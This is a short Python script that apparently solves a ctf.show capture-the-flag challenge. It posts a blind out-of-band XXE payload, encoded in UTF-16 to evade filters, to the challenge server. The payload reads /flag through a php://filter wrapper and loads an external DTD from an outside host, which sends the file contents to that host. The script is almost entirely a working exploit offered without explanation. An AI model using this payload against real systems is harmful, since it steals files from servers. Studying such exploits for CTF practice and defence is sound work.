import requests

url = 'http://49a89a07-b689-436b-bc70-831fff972a8a.challenge.ctf.show/:8080/'
data = """<!DOCTYPE ANY [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % dtd SYSTEM "http://mc1.mccsm.cn:26225/xxe.xml">
%dtd;
%send;
] >"""

requests.post(url ,data=data.encode('utf-16'))
print("OK!")
